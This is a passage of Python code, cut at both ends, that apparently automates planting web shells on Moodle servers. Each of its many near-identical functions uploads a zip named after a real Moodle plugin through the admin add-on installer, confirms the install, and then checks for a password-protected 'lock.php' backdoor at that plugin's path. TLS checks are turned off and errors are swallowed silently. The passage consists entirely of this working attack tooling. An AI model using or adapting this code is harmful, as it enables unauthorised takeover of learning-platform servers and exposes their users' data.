                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/auth/userkey/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellEnrol(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-enrol_apply-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/enrol/apply/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellTinymce(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-tinymce_recordrtc-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/lib/editor/tinymce/plugins/recordrtc/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellAtto(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-atto_c4l-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/lib/editor/atto/plugins/c4l/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellEditor(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-editor_ousupsub-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/lib/editor/ousupsub/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellFilter(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-filter_filtercodes-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/filter/filtercodes/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellQformat(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-qformat_wordtable-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/question/format/wordtable/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellQbeha(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-qbehaviour_interactiveexplain-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/question/behaviour/interactiveexplain/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False

    def UploadShellQbank(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-qbank_gitsync-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/question/bank/gitsync/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellQtype(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-qtype_combined-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/question/type/combined/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellWshopEval(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-workshopeval_credit-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
